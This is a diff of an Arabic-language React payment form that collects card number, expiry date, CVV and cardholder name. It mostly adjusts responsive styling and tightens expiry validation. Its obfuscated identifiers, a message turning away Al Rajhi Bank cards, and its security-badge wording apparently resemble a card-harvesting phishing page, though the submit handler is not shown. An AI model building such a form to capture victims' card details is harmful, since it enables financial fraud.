@@ -130,19 +130,34 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
   // Validate expiry date
   useEffect(() => {
-    if (_v3.length === 5) {
-      const [month, year] = _v3.split('/')
-      const currentDate = new Date()
-      const currentYear = currentDate.getFullYear() % 100 // Last 2 digits
-      const currentMonth = currentDate.getMonth() + 1
+    if (_v3.length >= 2) {
+      const parts = _v3.split('/')
+      const monthStr = parts[0]
+      const expMonth = parseInt(monthStr)
 
-      const expYear = parseInt(year)
-      const expMonth = parseInt(month)
+      if (expMonth < 1 || expMonth > 12) {
+        setExpiryError("الشهر يجب أن يكون بين 01 و 12")
+        return
+      }
 
-      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
-        setExpiryError("تاريخ البطاقة منتهي")
+      if (_v3.length === 5) {
+        const yearStr = parts[1]
+        const expYear = parseInt(yearStr)
+        const currentDate = new Date()
+        const currentYear = currentDate.getFullYear() % 100
+        const currentMonth = currentDate.getMonth() + 1
+
+        if (expYear > currentYear + 10) {
+          setExpiryError("تاريخ الانتهاء غير صالح")
+        } else if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+          setExpiryError("تاريخ البطاقة منتهي")
+        } else {
+          setExpiryError("")
+        }
       } else {
-        setExpiryError("")
+        if (expMonth >= 1 && expMonth <= 12) {
+          setExpiryError("")
+        }
       }
     } else {
       setExpiryError("")
@@ -389,14 +404,14 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         canClose={false}
       />
       
-      <div className={`space-y-5 ${showEmailModal ? 'blur-xl pointer-events-none' : ''}`} dir="rtl">
+      <div className={`space-y-4 sm:space-y-5 ${showEmailModal ? 'blur-xl pointer-events-none' : ''}`} dir="rtl">
         {/* Payment Method Selection */}
-        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-5 md:p-6 border border-gray-200">
-          <label className="flex items-center gap-2 text-gray-900 font-bold text-base md:text-lg mb-4">
-            <ShieldCheck className="w-5 h-5 text-[#0a4a68]" />
+        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-lg sm:rounded-xl p-3 sm:p-5 md:p-6 border border-gray-200">
+          <label className="flex items-center gap-2 text-gray-900 font-bold text-sm sm:text-base md:text-lg mb-3 sm:mb-4">
+            <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5 text-[#0a4a68]" />
             طريقة الدفع
           </label>
-          <div className="space-y-3">
+          <div className="space-y-2 sm:space-y-3">
             {[
               { 
                 value: "credit-card", 
@@ -425,8 +440,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               <div key={method.value}>
               <label
                 className={`
-                  relative flex items-center justify-between gap-3 p-4 md:p-5
-                  border-2 rounded-xl cursor-pointer transition-all duration-200
+                  relative flex items-center justify-between gap-2 sm:gap-3 p-3 sm:p-4 md:p-5
+                  border-2 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200
                   ${
                     selectedPaymentMethod === method.value
                       ? "border-[#0a4a68] bg-white shadow-md"
@@ -436,7 +451,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                   ${(method as any).unavailable ? "opacity-75" : ""}
                 `}
               >
-                <div className="flex items-center gap-3">
+                <div className="flex items-center gap-2 sm:gap-3 min-w-0">
                   <input
                     type="radio"
                     name="paymentMethod"
@@ -454,33 +469,32 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                       setSelectedPaymentMethod(method.value)
                     }}
                     disabled={method.disabled}
-                    className="w-5 h-5 text-[#0a4a68] focus:ring-[#0a4a68] disabled:opacity-50"
+                    className="w-4 h-4 sm:w-5 sm:h-5 text-[#0a4a68] focus:ring-[#0a4a68] disabled:opacity-50 flex-shrink-0"
                   />
-                  <div className="flex items-center gap-2">
+                  <div className="flex items-center gap-1.5 sm:gap-2 flex-shrink-0">
                     {method.icons ? (
                       method.icons.map((icon, idx) => (
-                        <img key={idx} src={icon} alt="logo" width={35} height={22} className="object-contain" />
+                        <img key={idx} src={icon} alt="logo" width={28} height={18} className="object-contain sm:w-[35px] sm:h-[22px]" />
                       ))
                     ) : (
-                      <img src={method.icon || "/placeholder.svg"} alt="logo" width={35} height={22} className="object-contain" />
+                      <img src={method.icon || "/placeholder.svg"} alt="logo" width={28} height={18} className="object-contain sm:w-[35px] sm:h-[22px]" />
                     )}
                   </div>
-                  <span className={`text-base md:text-lg font-semibold ${method.disabled ? 'text-gray-400' : 'text-gray-900'}`}>
+                  <span className={`text-sm sm:text-base md:text-lg font-semibold truncate ${method.disabled ? 'text-gray-400' : 'text-gray-900'}`}>
                     {method.label}
                   </span>
                 </div>
-                <div className="flex items-center gap-2">
+                <div className="flex items-center gap-2 flex-shrink-0">
                   {method.discount && (
-                    <Badge className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 font-bold px-3 py-1 text-xs shadow-sm">
+                    <Badge className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 font-bold px-2 sm:px-3 py-0.5 sm:py-1 text-[10px] sm:text-xs shadow-sm whitespace-nowrap">
                       خصم {method.discount}
                     </Badge>
                   )}
                 </div>
               </label>
-              {/* Error message below selected option */}
               {method.message && selectedPaymentMethod === method.value && (
-                <div className="mt-2 p-3 bg-red-50 border border-red-200 rounded-lg" dir="rtl">
-                  <p className="text-sm text-red-600 font-medium">
+                <div className="mt-2 p-2 sm:p-3 bg-red-50 border border-red-200 rounded-lg" dir="rtl">
+                  <p className="text-xs sm:text-sm text-red-600 font-medium">
                     {method.message}
                   </p>
                 </div>
@@ -491,10 +505,10 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         </div>
 
         {/* Card Information Form */}
-        <form onSubmit={_hp} className="space-y-4">
+        <form onSubmit={_hp} className="space-y-3 sm:space-y-4">
           {/* Card Holder Name */}
-          <div className="space-y-2">
-            <label className="block text-gray-900 font-bold text-sm md:text-base">
+          <div className="space-y-1.5 sm:space-y-2">
+            <label className="block text-gray-900 font-bold text-xs sm:text-sm md:text-base">
               اسم حامل البطاقة
             </label>
             <Input
@@ -503,24 +517,24 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               onChange={(e) => _s4(e.target.value.toUpperCase())}
               placeholder="CARDHOLDER NAME"
               dir="ltr"
-              className="h-14 md:h-16 text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl"
+              className="h-12 sm:h-14 md:h-16 text-base sm:text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#0a4a68] rounded-lg sm:rounded-xl"
               required
             />
           </div>
 
           {/* Card Number Input */}
-          <div className="space-y-2">
-            <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
-              <CreditCard className="w-4 h-4 text-[#0a4a68]" />
+          <div className="space-y-1.5 sm:space-y-2">
+            <label className="flex items-center flex-wrap gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
+              <CreditCard className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a4a68]" />
               رقم البطاقة
               {isValidCard && (
-                <Badge variant="outline" className="border-green-500 text-green-700 text-xs">
+                <Badge variant="outline" className="border-green-500 text-green-700 text-[10px] sm:text-xs">
                   <ShieldCheck className="w-3 h-3 ml-1" />
                   صالح
                 </Badge>
               )}
               {cardType && (
-                <Badge className="bg-blue-100 text-blue-800 text-xs">
+                <Badge className="bg-blue-100 text-blue-800 text-[10px] sm:text-xs">
                   {cardType}
                 </Badge>
               )}
@@ -532,7 +546,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               placeholder="1234 5678 9012 3456"
               maxLength={19}
               dir="ltr"
-              className={`h-14 md:h-16 text-xl md:text-2xl font-mono tracking-wider border-2 rounded-xl transition-all ${
+              className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono tracking-wider border-2 rounded-lg sm:rounded-xl transition-all ${
                 isValidCard 
                   ? "border-green-500 focus:border-green-600" 
                   : _v1.length > 0 
@@ -542,21 +556,21 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               required
             />
             {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
-              <p className="text-red-500 text-xs">يجب أن يكون 16 رقم</p>
+              <p className="text-red-500 text-[11px] sm:text-xs">يجب أن يكون 16 رقم</p>
             )}
             {cardRejectionError && (
-              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
-                <p className="text-red-700 text-sm font-bold">
+              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-2 sm:p-3 mt-1 sm:mt-2">
+                <p className="text-red-700 text-xs sm:text-sm font-bold">
                   {cardRejectionError}
                 </p>
               </div>
             )}
             {isCardBlockedState && (
-              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
-                <p className="text-red-700 text-sm font-bold">
-                  ⚠️ تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية
+              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-2 sm:p-3 mt-1 sm:mt-2">
+                <p className="text-red-700 text-xs sm:text-sm font-bold">
+                  تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية
                 </p>
-                <p className="text-red-600 text-xs mt-1">
+                <p className="text-red-600 text-[11px] sm:text-xs mt-1">
                   الرجاء إدخال بطاقة من مصرف آخر
                 </p>
               </div>
@@ -564,9 +578,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           </div>
 
           {/* Expiry and CVV */}
-          <div className="grid grid-cols-2 gap-3 md:gap-4">
-            <div className="space-y-2">
-              <label className="block text-gray-900 font-bold text-sm md:text-base">
+          <div className="grid grid-cols-2 gap-2 sm:gap-3 md:gap-4">
+            <div className="space-y-1.5 sm:space-y-2">
+              <label className="block text-gray-900 font-bold text-xs sm:text-sm md:text-base">
                 تاريخ الانتهاء
               </label>
               <Input
@@ -576,20 +590,22 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 placeholder="MM/YY"
                 maxLength={5}
                 dir="ltr"
-                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${
+                className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
                   expiryError 
                     ? "border-red-500 focus:border-red-600" 
+                    : _v3.length === 5 && !expiryError
+                    ? "border-green-500 focus:border-green-600"
                     : "border-gray-300 focus:border-[#0a4a68]"
                 }`}
                 required
               />
               {expiryError && (
-                <p className="text-red-500 text-xs">{expiryError}</p>
+                <p className="text-red-500 text-[11px] sm:text-xs">{expiryError}</p>
               )}
             </div>
-            <div className="space-y-2">
-              <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
-                <Lock className="w-4 h-4 text-[#0a4a68]" />
+            <div className="space-y-1.5 sm:space-y-2">
+              <label className="flex items-center gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
+                <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a4a68]" />
                 CVV
               </label>
               <Input
@@ -599,23 +615,27 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 placeholder="123"
                 maxLength={3}
                 dir="ltr"
-                className="h-14 md:h-16 text-xl md:text-2xl font-mono border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl"
+                className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
+                  _v2.length === 3
+                    ? "border-green-500 focus:border-green-600"
+                    : "border-gray-300 focus:border-[#0a4a68]"
+                }`}
                 required
               />
               {_v2.length > 0 && _v2.length !== 3 && (
-                <p className="text-red-500 text-xs">يجب أن يكون 3 أرقام</p>
+                <p className="text-red-500 text-[11px] sm:text-xs">يجب أن يكون 3 أرقام</p>
               )}
             </div>
           </div>
 
           {/* Price Summary - Compact */}
           {getDiscountAmount() && (
-            <div className="bg-green-50 rounded-lg p-3 border border-green-200">
-              <div className="flex justify-between items-center text-sm">
+            <div className="bg-green-50 rounded-lg p-2.5 sm:p-3 border border-green-200">
+              <div className="flex justify-between items-center text-xs sm:text-sm">
                 <span className="text-gray-600">السعر الأصلي:</span>
                 <span className="text-gray-600 line-through">{offerTotalPrice.toFixed(2)} ﷼</span>
               </div>
-              <div className="flex justify-between items-center text-sm mt-1">
+              <div className="flex justify-between items-center text-xs sm:text-sm mt-1">
                 <span className="text-green-600 font-semibold">خصم {getDiscountAmount()}:</span>
                 <span className="text-green-600 font-semibold">
                   -{(offerTotalPrice * 0.15).toFixed(2)} ﷼
@@ -628,15 +648,15 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           <Button
             type="submit"
             disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4}
-            className="w-full h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl md:text-2xl rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+            className="w-full h-14 sm:h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-lg sm:text-xl md:text-2xl rounded-lg sm:rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            <Lock className="w-5 h-5 ml-2" />
+            <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
             دفع {finalPrice.toFixed(2)} ﷼
           </Button>
 
           {/* Security Notice */}
-          <div className="flex items-center justify-center gap-2 text-gray-500 text-xs md:text-sm">
-            <ShieldCheck className="w-4 h-4" />
+          <div className="flex items-center justify-center gap-1.5 sm:gap-2 text-gray-500 text-[11px] sm:text-xs md:text-sm">
+            <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
             <span>معاملتك محمية بتشفير SSL 256-bit</span>
           </div>
         </form>
